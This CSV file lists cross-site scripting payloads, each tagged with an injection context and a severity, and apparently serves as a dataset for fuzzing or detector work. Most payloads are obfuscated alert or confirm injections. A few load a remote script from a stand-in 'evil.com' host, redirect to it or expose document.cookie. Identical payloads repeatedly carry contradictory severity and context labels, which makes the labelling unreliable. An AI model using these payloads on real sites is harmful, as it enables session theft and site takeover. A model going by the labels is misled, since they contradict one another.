payload,context,severity
"setTimeout(	""alert(	1)"",0)",dom_sink,high
<script>\u0061\u006cert(document.dom\u0061in)</script>,script_injection,low
<script>\u0061\u006cert(document.dom\u0061in)</script>,script_injection,medium
<svg/onload=confirm(1)>,tag_injection,high
<svg/onload=confirm(1)>,tag_injection,high
<svg/onload=confirm(1)>,tag_injection,medium
<svg/onload=confirm(1)>,attribute_escape,high
<svg/onload=confirm(1)>,js_uri,high
<svg/onload=confirm(1)>,template_injection,medium
<svg/onload=confirm(1)>,js_uri,high
<svg/onload=confirm(1)>,tag_injection,high
<svg/onload=confirm(1)>,tag_injection,medium
<svg/onload=confirm(1)>,attribute,high
\x3cscript\x3ealert(1)\x3c/script\x3e,template_injection,low
\x3cscript\x3ealert(1)\x3c/script\x3e,script_injection,medium
\x3cscript\x3ealert(1)\x3c/script\x3e,script_injection,high
\x3cscript\x3ealert(1)\x3c/script\x3e,script_injection,high
"{{constructor.constructor(""confirm(1)"")()}}",template_injection,medium
"{{constructor.constructor(""confirm(1)"")()}}",template_injection,high
"{{constructor.constructor(""confirm(1)"")()}}",script_injection,medium
"{{constructor.constructor(""confirm(1)"")()}}",attribute_escape,low
"{{constructor.constructor(""confirm(1)"")()}}",dom_sink,high
"{{constructor.constructor(""confirm(1)"")()}}",template_injection,high
"{{constructor.constructor(""confirm(1)"")()}}",dom_sink,high
"{{constructor.constructor(""confirm(1)"")()}}",template_injection,medium
"{{constructor.constructor(""confirm(1)"")()}}",event_handler,high
"onerror=""alert(1)""",html_body,medium
"onerror=""alert(1)""",html_body,medium
"onerror=""alert(1)""",html_body,medium
"onerror=""alert(1)""",html_body,medium
"onerror=""alert(1)""",html_body,medium
"onerror=""alert(1)""",html_body,medium
"onerror=""alert(1)""",html_body,medium
"onerror=""alert(1)""",html_body,medium
"onerror=""alert(1)""",html_body,medium
"onerror=""alert(1)""",html_body,medium
javascript:alert(	document.domain),js_uri,high
javascript:alert(	document.domain),dom_sink,high
javascript:alert(	document.domain),js_uri,low
javascript:alert(	document.domain),js_uri,low
javascript:alert(	document.domain),js_uri,low
javascript:alert(	document.domain),js_uri,medium
javascript:alert(	document.domain),js_uri,medium
"\"" onerror
=alert(	1)//",attribute,low
"\"" onerror
=alert(	1)//",attribute_escape,low
"\"" onerror
=alert(	1)//",attribute_escape,medium
"dOcUmEnT.WrItE(""<ImG SrC=X OnErRoR=AlErT(1)>"")",dom_sink,medium
"<script
>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
<%= aLeRt(1) %>,template_injection,medium
<%= aLeRt(1) %>,template_injection,medium
<%= aLeRt(1) %>,template_injection,high
<%= aLeRt(1) %>,script_injection,high
<%= aLeRt(1) %>,script_injection,low
"%3Ciframe src=""javascript:alert(1)""%3E",tag_injection,medium
"%3Ciframe src=""javascript:alert(1)""%3E",event_handler,low
"%3Ciframe src=""javascript:alert(1)""%3E",tag_injection,high
<marquee onstart=al'+'ert(1)>,event_handler,medium
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,medium
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,medium
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,high
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,low
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,low
&lt;%= alert(1) %&gt;,template_injection,high
&lt;%= alert(1) %&gt;,dom_sink,medium
&lt;%= alert(1) %&gt;,script_injection,low
${\u0061\u006cert(1)},attribute_escape,medium
${\u0061\u006cert(1)},template_injection,low
${\u0061\u006cert(1)},template_injection,high
${\u0061\u006cert(1)},event_handler,high
"location
=""javascript:alert(	1)""",dom_sink,low
"location
=""javascript:alert(	1)""",dom_sink,low
"location
=""javascript:alert(	1)""",dom_sink,medium
"<embed src=""javascript:confirm(1)"">",tag_injection,high
"<embed src=""javascript:confirm(1)"">",tag_injection,high
"<embed src=""javascript:confirm(1)"">",tag_injection,low
"<embed src=""javascript:confirm(1)"">",tag_injection,high
"<embed src=""javascript:confirm(1)"">",tag_injection,low
"<embed src=""javascript:confirm(1)"">",tag_injection,medium
"<embed src=""javascript:confirm(1)"">",template_injection,high
"<embed src=""javascript:confirm(1)"">",tag_injection,high
"<embed src=""javascript:confirm(1)"">",attribute,medium
"<svG/x="">""/oNloaD=confirm()//",attribute,medium
"<svG/x="">""/oNloaD=confirm()//",attribute,medium
onwheel='alert(1)',html_body,medium
onwheel='alert(1)',attribute,medium
"<%00script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
\x3cscript\x3eprompt(1)\x3c/script\x3e,attribute,medium
\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,high
\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
%3Cscript%3Ealert(document.domain)%3C/script%3E,attribute,high
%3Cscript%3Ealert(document.domain)%3C/script%3E,script_injection,high
&lt;img/src=x onerror=alert(1)//&gt;,event_handler,medium
&lt;img/src=x onerror=alert(1)//&gt;,js_uri,high
&lt;img/src=x onerror=alert(1)//&gt;,event_handler,low
\x3cSCRIPT\x3ealert(1)\x3c/SCRIPT\x3e,script_injection,low
\x3cSCRIPT\x3ealert(1)\x3c/SCRIPT\x3e,script_injection,high
"onload&#61;""alert(1)""",html_body,medium
<ImG/SrC=X OnErRoR=AlErT(1)//>,event_handler,high
<ImG/SrC=X OnErRoR=AlErT(1)//>,event_handler,low
"<sCRIPt>d.inneRHTml+='';</scRiPT>//[""'`-->]]>]</DIV>",html_body,high
<textarea>d.innerHTML+='';</script>,html_body,high
<textarea>d.innerHTML+='';</script>,html_body,high
""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,medium
""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,low
""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,low
""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,low
"<audio>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
#jAVAScRIPT:ALERT(2);,url,medium
x=1}}};alert(1)//,attribute,medium
\x3cimg/src=x onerror=alert(1)//\x3e,event_handler,high
\x3cimg/src=x onerror=alert(1)//\x3e,attribute,medium
\x3cimg/src=x onerror=alert(1)//\x3e,event_handler,high
\x3cimg/src=x onerror=alert(1)//\x3e,attribute_escape,low
%3Cimg/src=%3Dx+onload=alert(2)%3D,attribute,medium
onload&#61;'alert(1)',html_body,medium
"setTimeout(""\u0061\u006cert(1)"",0)",attribute,medium
"setTimeout(""\u0061\u006cert(1)"",0)",template_injection,medium
javascript:confirm(document.domain),attribute,medium
javascript:confirm(document.domain),script_injection,medium
javascript:confirm(document.domain),js_uri,medium
javascript:confirm(document.domain),js_uri,low
"document.write(""<img src=x onerror=confirm(1)>"")",event_handler,medium
"document.write(""<img src=x onerror=confirm(1)>"")",tag_injection,high
"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink,low
"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink,high
"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,low
"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,medium
"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,high
"<embed src=""javaSCRIPT:alert(1)"">",script_injection,medium
<SCRIPT>prompt(1)</SCRIPT>,script_injection,medium
<SCRIPT>prompt(1)</SCRIPT>,script_injection,medium
<SCRIPT>prompt(1)</SCRIPT>,attribute,low
%3Cdetails open ontoggle=alert(1)%3E,event_handler,high
"data:text/html,\x3cscript\x3ealert(1)\x3c/script\x3e",js_uri,high
"onload=""confirm(1)""",html_body,medium
confirm(1);,attribute,medium
"<button>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
"j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"")",js_uri,high
"j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"")",attribute,medium
<svg/onload=al'+'ert(1)>,tag_injection,medium
<svg/onload=al'+'ert(1)>,tag_injection,low
<svg/onload=al'+'ert(1)>,tag_injection,high
<svg/onload=al'+'ert(1)>,attribute_escape,high
&quot; onload=alert(1) x=&quot;,attribute_escape,high
&quot; onload=alert(1) x=&quot;,attribute_escape,medium
&quot; onload=alert(1) x=&quot;,attribute_escape,medium
<ScRiPt sRc=//eViL.CoM/XsS.Js></sCrIpT>,script_injection,low
\u003cimg src onerror=confirm`1`\u003e,attribute,medium
"<vIdeO/><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",attribute,high
ONLoaD='aLert(1)',html_body,medium
"data:text/html,%3Cscript%3Ealert(1)%3C/script%3E",js_uri,low
%3Cscript%3Econfirm(1)%3C/script%3E,script_injection,medium
%3Cscript%3Econfirm(1)%3C/script%3E,tag_injection,high
%3Cscript%3Econfirm(1)%3C/script%3E,script_injection,high
\' onerror=\u0061\u006cert(1)//,attribute_escape,low
\' onerror=\u0061\u006cert(1)//,tag_injection,high
%3cimg onerror=prompt(1) src=a%3e,attribute,medium
#javascript:alert(document.cookie);,url,medium
"onerror=""prompt`1`""",html_body,medium
"""><%00script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<ScRiPt>aLeRt(1)</sCrIpT>,script_injection,high
' onmouseover=al'+'ert(1) ',attribute,high
%3Cscript%3Eprompt(1)%3C/script%3E,script_injection,high
‘)alert(1);//,attribute,medium
onERROR='AlErt(1)',html_body,medium
<SvG/OnLoAd=aLeRt(1)>,tag_injection,low
<SvG/OnLoAd=aLeRt(1)>,tag_injection,medium
<table/onload=alert(0);>,html_body,medium
"document.write(""&lt;img src=x onerror=alert(1)&gt;"")",attribute_escape,low
onloaD='aLeRT(1)',attribute,medium
onload='confirm`1`',attribute,medium
"lOcAtIoN=""jAvAsCrIpT:AlErT(1)""",tag_injection,medium
<Svg onloAD=alErt()>,html_body,medium
